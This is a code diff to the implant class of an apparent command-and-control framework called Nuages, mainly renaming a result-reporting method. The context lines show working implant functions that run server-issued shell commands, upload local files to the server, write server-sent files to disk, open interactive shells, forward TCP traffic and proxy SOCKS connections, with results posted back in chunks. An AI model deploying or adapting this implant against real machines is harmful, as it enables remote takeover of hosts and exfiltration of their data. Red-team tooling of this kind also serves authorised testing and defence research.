@@ -271,7 +271,7 @@ class NuagesImplant:
             self.nuages.POSTBIN(pipe_id, dataToSend, 0)
             time.sleep(refreshrate)
 
-    def jobResult(self, job_id, result, error):
+    def jobresult(self, job_id, result, error):
         # The implant wont send more than this amount of data per request
         buffersize = int(self.config["buffersize"])
         i = 0
@@ -282,7 +282,7 @@ class NuagesImplant:
                 'jobId': job_id,\
                 'result': "",\
                 'error': error})
-            self.nuages.POST("jobResult", data)
+            self.nuages.POST("jobresult", data)
             return
         # Let's chunk the result into pieces and submit them to the server
         while(i < l):
@@ -297,7 +297,7 @@ class NuagesImplant:
                 'result': result[i:i+buffersize],\
                 'error': error})
             i += buffersize
-            self.nuages.POST("jobResult", data)
+            self.nuages.POST("jobresult", data)
     
     def do_command(self, job):
         # If a path is provided we execute the job in that path
@@ -308,7 +308,7 @@ class NuagesImplant:
         result = child.communicate()[0]
         error = (child.returncode != 0)
         # The result is returned to the server
-        self.jobResult(job["_id"], result.decode("utf-8"), error)
+        self.jobresult(job["_id"], result.decode("utf-8"), error)
 
     def do_download(self, job):
         # If a path is provided we execute the job in that path
@@ -325,7 +325,7 @@ class NuagesImplant:
         with open(target, "wb") as fs:
             # We use pipe2stream to pipe the Nuages pipe into the filestream
             self.pipe2stream(job["payload"]["options"]["pipe_id"], fs, job["payload"]["options"]["length"])    
-            self.jobResult(job["_id"], fs.name, False)
+            self.jobresult(job["_id"], fs.name, False)
         
     def do_upload(self, job):
         # If a path is provided we execute the job in that path
@@ -337,7 +337,7 @@ class NuagesImplant:
         with open(job["payload"]["options"]["file"], "rb") as fs:
             # We use stream2pipe to pipe the filestream into the Nuages pipe
             self.stream2pipe(job["payload"]["options"]["pipe_id"], fs)    
-            self.jobResult(job["_id"], fs.name, False)
+            self.jobresult(job["_id"], fs.name, False)
 
     def do_interactive(self, job):
         refreshrate = float(self.config["refreshrate"]) / 1000
@@ -385,7 +385,7 @@ class NuagesImplant:
             del queue
             raise e
         del queue
-        self.jobResult(job["_id"], "Process Exited!", False)
+        self.jobresult(job["_id"], "Process Exited!", False)
 
     def do_configure(self, job):
         # If the config must be changed
@@ -395,7 +395,7 @@ class NuagesImplant:
             for key in config:
                 self.config[key] = config[key]
         # We return the configuration to the client at text
-        self.jobResult(job["_id"], json.dumps(self.config), False)
+        self.jobresult(job["_id"], json.dumps(self.config), False)
 
     def do_tcp_fwd(self, job):
         host = job["payload"]["options"]["host"]
@@ -430,7 +430,7 @@ class NuagesImplant:
                 else:
                     # If the socket did not timeout but returned "", it has been closed
                     if(len(outbuff) == 0):
-                        self.jobResult(job["_id"], "Server closed connection", False)
+                        self.jobresult(job["_id"], "Server closed connection", False)
                         return
                     # If we read an entire buffer before timeout (seems very unlikely)
                     else:       
@@ -440,7 +440,7 @@ class NuagesImplant:
         except Exception as e:
                 # If the pipe has been deleted
             if(str(e) == "404"):
-                self.jobResult(job["_id"], "Client closed connection", False)
+                self.jobresult(job["_id"], "Client closed connection", False)
                 return
             else:
                 raise(e)
@@ -562,7 +562,7 @@ class NuagesImplant:
                 else:
                     # If the socket did not timeout but returned "", it has been closed
                     if(len(outbuff) == 0):
-                        self.jobResult(job["_id"], "Server closed connection", False)
+                        self.jobresult(job["_id"], "Server closed connection", False)
                         return
                     # If we read an entire buffer before timeout (seems very unlikely)
                     else:       
@@ -572,7 +572,7 @@ class NuagesImplant:
         except Exception as e:
                 # If the pipe has been deleted
             if(str(e) == "404"):
-                self.jobResult(job["_id"], "Client closed connection", False)
+                self.jobresult(job["_id"], "Client closed connection", False)
                 return
             else:
                 raise(e)
@@ -585,11 +585,11 @@ class NuagesImplant:
         if ("dir" in job["payload"]["options"]):
             os.chdir(job["payload"]["options"]["dir"])
         # The new directory is returned to the server
-        self.jobResult(job["_id"], os.getcwd(), False)
+        self.jobresult(job["_id"], os.getcwd(), False)
 
     def do_exit(self, job):
         # The implant exits with a message
-        self.jobResult(job["_id"], "Bye!", False)
+        self.jobresult(job["_id"], "Bye!", False)
         os._exit(0)
     
     def executeJob(self, job):
@@ -614,8 +614,8 @@ class NuagesImplant:
                 self.do_socks(job)
         except Exception as e:
             # If the job fails, we inform the server
-            self.jobResult(job["_id"], str(e), True)
-            raise e
+            self.jobresult(job["_id"], str(e), True)
+            #raise e
 
     def start(self):
         # Registering the implant
